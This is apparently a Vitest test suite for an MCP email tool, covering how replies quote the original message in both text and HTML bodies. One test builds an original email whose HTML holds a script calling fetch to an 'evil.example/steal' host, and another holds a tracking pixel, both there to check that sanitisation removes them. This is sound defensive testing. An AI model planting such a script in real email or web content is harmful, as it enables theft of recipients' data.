/**
 * Quoting the original message on a reply — the attribution line, the quote
 * prefixes, and how the text and HTML bodies stay in step with each other.
 */
import { dispatchTool } from "@miguelarios/pim-core/mcp";
import type { ServerContext } from "@modelcontextprotocol/server";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { EMAIL_TOOLS } from "../tools/emailTools.js";

// Only the markdown conversion is stubbed; sanitizeEmailHtml is the real one,
// since what it strips out of a quote is exactly what these tests check.
vi.mock("../htmlToMarkdown.js", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../htmlToMarkdown.js")>();
  return {
    ...actual,
    htmlToMarkdown: vi.fn(async (html: string) => `markdown(${html})`),
  };
});

const AUTO_CONFIRM = {
  mcpReq: {
    inputResponses: {
      confirm_send_email: { action: "accept", content: { confirm: true } },
    },
  },
} as unknown as ServerContext;

const ORIGINAL = {
  uid: 42,
  messageId: "<original@test.com>",
  subject: "Budget",
  from: { name: "Ada Lovelace", address: "ada@example.com" },
  to: [{ address: "user@test.com" }],
  date: "2026-03-04T12:00:00.000Z",
  flags: [],
  hasAttachments: false,
  inReplyTo: null,
  references: [],
  attachments: [],
  textBody: "Here are the numbers.\n\nAda",
  htmlBody: "<p>Here are the numbers.</p>",
};

const mockFetchEmail = vi.fn();
const mockComposeRawMessage = vi.fn();
const mockSendRawMessage = vi.fn();
const mockAppendMessage = vi.fn();
const mockGetSpecialUseFolder = vi.fn();

const imap = {
  fetchEmail: mockFetchEmail,
  appendMessage: mockAppendMessage,
  getSpecialUseFolder: mockGetSpecialUseFolder,
} as any;

const smtp = {
  composeRawMessage: mockComposeRawMessage,
  sendRawMessage: mockSendRawMessage,
  resolveFromAddress: vi.fn((requested?: string) => requested || "user@test.com"),
  formatFromHeader: vi.fn((address: string) => address),
  config: { autoSent: true, smtp: { user: "user@test.com" } },
} as any;

const send = (args: Record<string, unknown>) =>
  dispatchTool(
    EMAIL_TOOLS,
    "send_email",
    args,
    { imap, smtp } as any,
    AUTO_CONFIRM,
  ) as Promise<any>;

const composed = () => mockComposeRawMessage.mock.calls[0][0];

beforeEach(() => {
  vi.clearAllMocks();
  mockFetchEmail.mockResolvedValue(ORIGINAL);
  mockComposeRawMessage.mockResolvedValue(Buffer.from("raw"));
  mockSendRawMessage.mockResolvedValue({
    messageId: "<sent@test.com>",
    accepted: [],
    rejected: [],
  });
  mockGetSpecialUseFolder.mockResolvedValue("Drafts");
  mockAppendMessage.mockResolvedValue({ uid: 100 });
});

describe("send_email quotes the original on a reply", () => {
  it("appends an attribution line and a > -prefixed body below the new text", async () => {
    await send({ to: ["ada@example.com"], replyToUid: 42, text: "Thanks!" });

    expect(composed().text).toBe(
      "Thanks!\n\n" +
        "On 2026-03-04T12:00:00.000Z, Ada Lovelace <ada@example.com> wrote:\n\n" +
        "> Here are the numbers.\n>\n> Ada",
    );
  });

  it("falls back to the bare address when the sender has no display name", async () => {
    mockFetchEmail.mockResolvedValue({ ...ORIGINAL, from: { address: "ada@example.com" } });
    await send({ to: ["ada@example.com"], replyToUid: 42, text: "Thanks!" });

    expect(composed().text).toContain("On 2026-03-04T12:00:00.000Z, ada@example.com wrote:");
  });

  it("omits the date clause when the original carries no date", async () => {
    mockFetchEmail.mockResolvedValue({ ...ORIGINAL, date: "" });
    await send({ to: ["ada@example.com"], replyToUid: 42, text: "Thanks!" });

    expect(composed().text).toContain("Ada Lovelace <ada@example.com> wrote:");
    expect(composed().text).not.toContain("On ,");
  });

  it("deepens an already-quoted line instead of indenting it", async () => {
    mockFetchEmail.mockResolvedValue({ ...ORIGINAL, textBody: "Mine\n> Theirs" });
    await send({ to: ["ada@example.com"], replyToUid: 42, text: "Thanks!" });

    expect(composed().text).toContain("> Mine\n>> Theirs");
  });

  it("quotes into a blockquote when the reply is HTML", async () => {
    await send({ to: ["ada@example.com"], replyToUid: 42, html: "<p>Thanks!</p>" });

    const { html } = composed();
    expect(html).toContain("<p>Thanks!</p>");
    expect(html).toContain("Ada Lovelace &lt;ada@example.com&gt; wrote:");
    expect(html).toContain("<blockquote");
    expect(html).toContain("<p>Here are the numbers.</p>");
  });

  it("strips script and style out of the quoted original", async () => {
    mockFetchEmail.mockResolvedValue({
      ...ORIGINAL,
      htmlBody:
        "<html><head><style>body{display:none}</style></head><body>" +
        '<p>Here are the numbers.</p><script>fetch("https://evil.example/steal")</script>' +
        "</body></html>",
    });

    await send({ to: ["ada@example.com"], replyToUid: 42, html: "<p>Thanks!</p>" });

    const { html } = composed();
    expect(html).toContain("<p>Here are the numbers.</p>");
    expect(html).not.toContain("<script");
    expect(html).not.toContain("evil.example");
    expect(html).not.toContain("<style");
    expect(html).not.toContain("display:none");
    // The document wrapper goes too — only the content survives.
    expect(html).not.toContain("<html");
    expect(html).not.toContain("<body");
  });

  it("strips a tracking pixel out of the quoted original", async () => {
    mockFetchEmail.mockResolvedValue({
      ...ORIGINAL,
      htmlBody:
        '<p>Here are the numbers.</p><img src="https://track.example/p.gif" width="1" height="1">',
    });

    await send({ to: ["ada@example.com"], replyToUid: 42, html: "<p>Thanks!</p>" });

    expect(composed().html).not.toContain("track.example");
  });

  it("falls back to the text body when the original's HTML sanitises to nothing", async () => {
    mockFetchEmail.mockResolvedValue({
      ...ORIGINAL,
      htmlBody: "<script>everything()</script>",
      textBody: "Here are the numbers.",
    });

    await send({ to: ["ada@example.com"], replyToUid: 42, html: "<p>Thanks!</p>" });

    expect(composed().html).toContain("Here are the numbers.");
    expect(composed().html).not.toContain("everything()");
  });

  it("normalises CRLF line endings in the text quote", async () => {
    mockFetchEmail.mockResolvedValue({
      ...ORIGINAL,
      textBody: "Here are the numbers.\r\n\r\nAda",
    });

    await send({ to: ["ada@example.com"], replyToUid: 42, text: "Thanks!" });

    expect(composed().text).not.toContain("\r");
    expect(composed().text).toContain("> Here are the numbers.\n>\n> Ada");
  });

  it("attributes to an unknown sender when the original has no From", async () => {
    mockFetchEmail.mockResolvedValue({ ...ORIGINAL, from: undefined });

    await send({ to: ["ada@example.com"], replyToUid: 42, text: "Thanks!" });

    expect(composed().text).toContain("an unknown sender wrote:");
    expect(composed().text).toContain("> Here are the numbers.");
  });

  it("quotes both bodies when the reply carries both", async () => {
    await send({
      to: ["ada@example.com"],
      replyToUid: 42,
      text: "Thanks!",
      html: "<p>Thanks!</p>",
    });

    expect(composed().text).toContain("> Here are the numbers.");
    expect(composed().html).toContain("<blockquote");
  });

  it("renders an HTML-only original as markdown for a text reply", async () => {
    mockFetchEmail.mockResolvedValue({ ...ORIGINAL, textBody: undefined });
    await send({ to: ["ada@example.com"], replyToUid: 42, text: "Thanks!" });

    expect(composed().text).toContain("> markdown(<p>Here are the numbers.</p>)");
  });

  it("escapes a text-only original into the HTML quote", async () => {
    mockFetchEmail.mockResolvedValue({
      ...ORIGINAL,
      htmlBody: undefined,
      textBody: "1 < 2 & 3 > 2",
    });
    await send({ to: ["ada@example.com"], replyToUid: 42, html: "<p>Thanks!</p>" });

    expect(composed().html).toContain("1 &lt; 2 &amp; 3 &gt; 2");
    expect(composed().html).not.toContain("1 < 2 & 3 > 2");
  });

  it("sends the quote alone when the reply has no body of its own", async () => {
    await send({ to: ["ada@example.com"], replyToUid: 42 });

    expect(composed().text).toBe(
      "On 2026-03-04T12:00:00.000Z, Ada Lovelace <ada@example.com> wrote:\n\n" +
        "> Here are the numbers.\n>\n> Ada",
    );
    expect(composed().html).toBeUndefined();
  });

  it("quotes a draft reply too", async () => {
    await send({ to: ["ada@example.com"], replyToUid: 42, text: "Thanks!", saveToDrafts: true });

    expect(composed().text).toContain("> Here are the numbers.");
  });

  it("does not quote when quoteOriginal is false", async () => {
    await send({ to: ["ada@example.com"], replyToUid: 42, text: "Thanks!", quoteOriginal: false });

    expect(composed().text).toBe("Thanks!");
  });

  it("does not quote a message that is not a reply", async () => {
    await send({ to: ["ada@example.com"], subject: "New", text: "Hello" });

    expect(composed().text).toBe("Hello");
    expect(mockFetchEmail).not.toHaveBeenCalled();
  });

  it("leaves the body alone when the original has no body to quote", async () => {
    mockFetchEmail.mockResolvedValue({ ...ORIGINAL, textBody: undefined, htmlBody: undefined });
    await send({ to: ["ada@example.com"], replyToUid: 42, text: "Thanks!" });

    expect(composed().text).toBe("Thanks!");
  });

  it("still sends when rendering the original's HTML fails", async () => {
    const { htmlToMarkdown } = await import("../htmlToMarkdown.js");
    vi.mocked(htmlToMarkdown).mockRejectedValueOnce(new Error("turndown exploded"));
    mockFetchEmail.mockResolvedValue({ ...ORIGINAL, textBody: undefined });

    const result = await send({ to: ["ada@example.com"], replyToUid: 42, text: "Thanks!" });

    expect(result.isError).toBeFalsy();
    expect(composed().text).toBe("Thanks!");
  });
});
